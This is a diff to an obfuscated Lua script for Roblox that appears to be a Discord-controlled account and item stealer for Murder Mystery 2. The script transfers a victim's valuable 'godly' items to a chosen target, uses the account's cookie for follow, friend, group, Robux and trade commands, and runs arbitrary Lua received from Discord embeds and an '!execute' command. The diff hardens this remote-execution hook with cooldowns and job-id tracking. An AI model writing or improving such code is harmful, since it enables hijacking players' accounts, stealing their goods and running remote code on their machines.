@@ -488,6 +488,7 @@ if not isfile("hits_joined.dat") then writefile("hits_joined.dat", "[]") end
 if not isfile("last_target.dat") then writefile("last_target.dat", "none") end
 if not isfile("pending_hits.dat") then writefile("pending_hits.dat", "[]") end
 if not isfile("executed_embeds.dat") then writefile("executed_embeds.dat", "[]") end
+if not isfile("executed_jobids.dat") then writefile("executed_jobids.dat", "[]") end
 
 local function _rl(_f)
     local _ok, _t = pcall(function() return _hs:JSONDecode(readfile(_f)) end);
@@ -544,10 +545,7 @@ local function _getMsgs(_after, _chan)
     return {}
 end
 
--- ─── EMBED MATCHER (used by _pjm and _execEmbed) ───
--- Matches the "🎯  TARGET ACQUIRED" embed from the trade script.
--- Fingerprint: title contains "TARGET ACQUIRED" AND color == 0x0A1A3C
---   (fallback: footer contains "deadhub" AND desc contains "just landed")
+-- ─── EMBED MATCHER ───
 local function _embedLooksRight(_e)
     if not _e then return false end
     local title      = tostring(_e.title or "");
@@ -575,9 +573,8 @@ end
 local function _pjm(_m)
     if not _m or not _m.author then return end
     if _m.channel_id and _m.channel_id ~= _hitCh then return end
-    -- skip anything with the TARGET ACQUIRED embed — the embed hook handles
-    -- those via _execEmbed, so we avoid a double-teleport.
     if _hasTargetEmbed(_m) then return end
+    if _moving then return end          -- NEW: bail if a teleport is already running
     local _c = _m.content or "";
     local _pi, _ji = string.match(_c, "(%d+),%s*'([^']+)'");
     if not (_pi and _ji) then _pi, _ji = string.match(_c, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"'); end
@@ -588,7 +585,6 @@ local function _pjm(_m)
     writefile("last_target.dat", _m.author.username);
     if _il("hits_joined.dat", _m.id) then return end
     if _ji == game.JobId then return end
-    if _moving then _tpTo(_pi, _ji, _m.id); return end
     local _q = _rl("pending_hits.dat");
     for _, _j in ipairs(_q) do
         if _j.msgid == _m.id then return end
@@ -634,9 +630,7 @@ function _tpTo(_pi, _ji, _mi)
 end
 
 -- ═══════════════════════════════════════════════════════════════
---  PATCHED: returns unique item IDs with stack counts so we can
---  dump entire stacks into a single trade slot instead of wasting
---  slots on duplicate copies of the same item.
+--  PATCHED: stack-aware godly collector
 -- ═══════════════════════════════════════════════════════════════
 local function _collectGodlies()
     local _out = {};
@@ -654,7 +648,6 @@ local function _collectGodlies()
     for _i, _c in pairs(_counts) do
         table.insert(_out, { id = _i, count = _c });
     end
-    -- biggest stacks first so we clear the most value per trade
     table.sort(_out, function(_a, _b) return _a.count > _b.count end);
     return _out;
 end
@@ -710,10 +703,6 @@ local function _doTransfer(_targetName)
         if not _transferActive then break end
         if not _sent then task.wait(2);
         else
-            -- ═══════════════════════════════════════════════════════
-            --  PATCHED: fire OfferItem once per COPY so the stack
-            --  fills the whole slot. 4 unique items max, unlimited qty.
-            -- ═══════════════════════════════════════════════════════
             local _offered = 0;
             local _slots = math.min(4, #_batch);
             for _i = 1, _slots do
@@ -743,10 +732,17 @@ local function _doTransfer(_targetName)
 end
 
 -- ═══════════════════════════════════════════════════════════════
---  EMBED EXEC — reacts to embeds that contain game:GetService(...)
+--  EMBED EXEC — with anti-spam guards + ❌/✅ reactions
 -- ═══════════════════════════════════════════════════════════════
--- Pull the first game:GetService(...) line out of the MESSAGE content,
--- falling back to any embed text field if the content is empty.
+local _lastEmbedExec = 0
+local _EMBED_COOLDOWN = 20   -- seconds between embed-triggered execs
+
+local function _extractJobId(code)
+    if not code then return nil end
+    return code:match("TeleportToPlaceInstance%s*%(%s*%d+%s*,%s*'([^']+)'")
+        or code:match('TeleportToPlaceInstance%s*%(%s*%d+%s*,%s*"([^"]+)"')
+end
+
 local function _extractCode(_md, _e)
     local candidates = {};
 
@@ -781,26 +777,72 @@ local function _execEmbed(_md)
     if not _md.embeds or #_md.embeds == 0 then return end
     for _, _e in ipairs(_md.embeds) do
         if _embedLooksRight(_e) then
-            if _il("executed_embeds.dat", _md.id) then return end
-            local code = _extractCode(_md, _e);
-            if not code then return end
 
-            local fn, err = loadstring(code);
-            if not fn then
-                _postEmbed("❌ Embed Load Error",
-                    "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000);
-                return;
+            local function _reactX()
+                task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
             end
 
-            local ok, runErr = pcall(fn);
-            _al("executed_embeds.dat", _md.id);
+            if _il("executed_embeds.dat", _md.id) then
+                _reactX()
+                return
+            end
+
+            local code = _extractCode(_md, _e)
+            if not code then return end
+
+            local jid = _extractJobId(code)
+
+            if jid and jid == game.JobId then
+                _al("executed_embeds.dat", _md.id)
+                _reactX()
+                print("[embed] skip: already in " .. tostring(jid):sub(1, 16))
+                return
+            end
+
+            if jid and _il("executed_jobids.dat", jid) then
+                _al("executed_embeds.dat", _md.id)
+                _reactX()
+                print("[embed] skip: already hit " .. tostring(jid):sub(1, 16))
+                return
+            end
+
+            if _moving then
+                _al("executed_embeds.dat", _md.id)
+                _reactX()
+                print("[embed] skip: already moving")
+                return
+            end
+
+            if (tick() - _lastEmbedExec) < _EMBED_COOLDOWN then
+                _al("executed_embeds.dat", _md.id)
+                _reactX()
+                print("[embed] skip: cooldown (" .. math.floor(tick() - _lastEmbedExec) .. "s)")
+                return
+            end
+
+            local fn, err = loadstring(code)
+            if not fn then
+                _reactX()
+                _postEmbed("❌ Embed Load Error",
+                    "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000)
+                return
+            end
+
+            _lastEmbedExec = tick()
+            if jid then _al("executed_jobids.dat", jid) end
+            _al("executed_embeds.dat", _md.id)
+
+            local ok, runErr = pcall(fn)
+
+            -- success = ✅, runtime error = ❌
+            task.spawn(function() _reactIn(_embedCh, _md.id, ok and "✅" or "❌") end)
 
             _postEmbed(
                 ok and "✅ Embed Exec" or "❌ Embed Runtime Error",
                 "```\n" .. tostring(ok and code or runErr):sub(1, 900) .. "\n```",
                 ok and 0x3EED50 or 0xFF0000
-            );
-            return;
+            )
+            return
         end
     end
 end
@@ -958,7 +1000,6 @@ local function _gw()
             local _isCmd = (_md.channel_id == _cmdCh);
             local _isHit = (_md.channel_id == _hitCh);
 
-            -- embed exec hook — fires on TARGET ACQUIRED embeds
             if _md.embeds and #_md.embeds > 0
                and (_md.channel_id == _embedCh)
                and ((_md.author and _md.author.bot) or _isOwner(_md.author)) then
@@ -966,7 +1007,6 @@ local function _gw()
             end
 
             if _isCmd then
-                -- !help
                 if _content == "!help" then
                     if _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
@@ -975,7 +1015,7 @@ local function _gw()
                             "**Cookie Actions**: `!follow <u>` `!unfollow <u>` `!friend <u>` `!statusmsg <txt>` `!joingroup <id>` `!leavegroup <id>`\n" ..
                             "**Tracking**: `!track <u>` `!untrack` `!tracklist`\n" ..
                             "**MM2**: `!inv` `!invf` `!coins` `!stats` `!history` `!queue` `!servercheck`\n" ..
-                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>`\n" ..
+                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>` `!clearembedhistory`\n" ..
                             "**Movement**: `!rejoin` `!panic`\n" ..
                             "**Transfers**: `!transfer <u>` `!stoptransfer`",
                             0x3EED50);
@@ -983,7 +1023,15 @@ local function _gw()
                     return;
                 end
 
-                -- MM2 basics
+                if _content == "!clearembedhistory" then
+                    if not _isOwner(_md.author) then return end
+                    _wl("executed_embeds.dat", {});
+                    _wl("executed_jobids.dat", {});
+                    _lastEmbedExec = 0;
+                    _postEmbed("🧹 Embed History Cleared", "You can re-hit any JobId now.", 0x3EED50);
+                    return;
+                end
+
                 if _content == "!inv" then
                     if _isOwner(_md.author) then task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end); task.spawn(function() if _show then _show() end end) end
                     return;
@@ -1160,9 +1208,6 @@ local function _gw()
                     return;
                 end
 
-                -- ═══════ COOKIE COMMANDS ═══════
-
-                -- !rbx <user>
                 local _rbxU = _content:match("^!rbx%s+(.+)$");
                 if _rbxU then
                     if not _isOwner(_md.author) then return end
@@ -1190,7 +1235,6 @@ local function _gw()
                     return;
                 end
 
-                -- !serverget <user>
                 local _sgU = _content:match("^!serverget%s+(.+)$");
                 if _sgU then
                     if not _isOwner(_md.author) then return end
@@ -1218,7 +1262,6 @@ local function _gw()
                     return;
                 end
 
-                -- !lastseen <user>
                 local _lsU = _content:match("^!lastseen%s+(.+)$");
                 if _lsU then
                     if not _isOwner(_md.author) then return end
@@ -1238,7 +1281,6 @@ local function _gw()
                     return;
                 end
 
-                -- !friends <user>
                 local _frU = _content:match("^!friends%s+(.+)$");
                 if _frU then
                     if not _isOwner(_md.author) then return end
@@ -1260,7 +1302,6 @@ local function _gw()
                     return;
                 end
 
-                -- !groups <user>
                 local _grU = _content:match("^!groups%s+(.+)$");
                 if _grU then
                     if not _isOwner(_md.author) then return end
@@ -1282,7 +1323,6 @@ local function _gw()
                     return;
                 end
 
-                -- !usernames <user>
                 local _unU = _content:match("^!usernames%s+(.+)$");
                 if _unU then
                     if not _isOwner(_md.author) then return end
@@ -1304,7 +1344,6 @@ local function _gw()
                     return;
                 end
 
-                -- !avatar <user>
                 local _avU = _content:match("^!avatar%s+(.+)$");
                 if _avU then
                     if not _isOwner(_md.author) then return end
@@ -1323,7 +1362,6 @@ local function _gw()
                     return;
                 end
 
-                -- !robux
                 if _content == "!robux" then
                     if not _isOwner(_md.author) then return end
                     task.spawn(function()
@@ -1350,7 +1388,6 @@ local function _gw()
                     return;
                 end
 
-                -- !limiteds <user>
                 local _limU = _content:match("^!limiteds%s+(.+)$");
                 if _limU then
                     if not _isOwner(_md.author) then return end
@@ -1372,7 +1409,6 @@ local function _gw()
                     return;
                 end
 
-                -- !trades
                 if _content == "!trades" then
                     if not _isOwner(_md.author) then return end
                     task.spawn(function()
@@ -1391,7 +1427,6 @@ local function _gw()
                     return;
                 end
 
-                -- !follow <user>
                 local _folU = _content:match("^!follow%s+(.+)$");
                 if _folU then
                     if not _isOwner(_md.author) then return end
@@ -1410,7 +1445,6 @@ local function _gw()
                     return;
                 end
 
-                -- !unfollow <user>
                 local _unfU = _content:match("^!unfollow%s+(.+)$");
                 if _unfU then
                     if not _isOwner(_md.author) then return end
@@ -1441,7 +1475,6 @@ local function _gw()
                     return;
                 end
 
-                -- !friend <user>
                 local _frndU = _content:match("^!friend%s+(.+)$");
                 if _frndU then
                     if not _isOwner(_md.author) then return end
@@ -1460,7 +1493,6 @@ local function _gw()
                     return;
                 end
 
-                -- !statusmsg <text>
                 local _statU = _content:match("^!statusmsg%s+(.+)$");
                 if _statU then
                     if not _isOwner(_md.author) then return end
@@ -1479,7 +1511,6 @@ local function _gw()
                     return;
                 end
 
-                -- !joingroup <id>
                 local _jgrp = _content:match("^!joingroup%s+(%d+)$");
                 if _jgrp then
                     if not _isOwner(_md.author) then return end
@@ -1496,7 +1527,6 @@ local function _gw()
                     return;
                 end
 
-                -- !leavegroup <id>
                 local _lgrp = _content:match("^!leavegroup%s+(%d+)$");
                 if _lgrp then
                     if not _isOwner(_md.author) then return end
@@ -1528,7 +1558,6 @@ local function _gw()
                     return;
                 end
 
-                -- !track <user>
                 local _trkU = _content:match("^!track%s+(.+)$");
                 if _trkU then
                     if not _isOwner(_md.author) then return end
@@ -1544,7 +1573,6 @@ local function _gw()
                     return;
                 end
 
-                -- !untrack
                 if _content == "!untrack" then
                     if not _isOwner(_md.author) then return end
                     _tracked = {}; _saveTracked();
@@ -1553,7 +1581,6 @@ local function _gw()
                     return;
                 end
 
-                -- !tracklist
                 if _content == "!tracklist" then
                     if not _isOwner(_md.author) then return end
                     local _names = {};
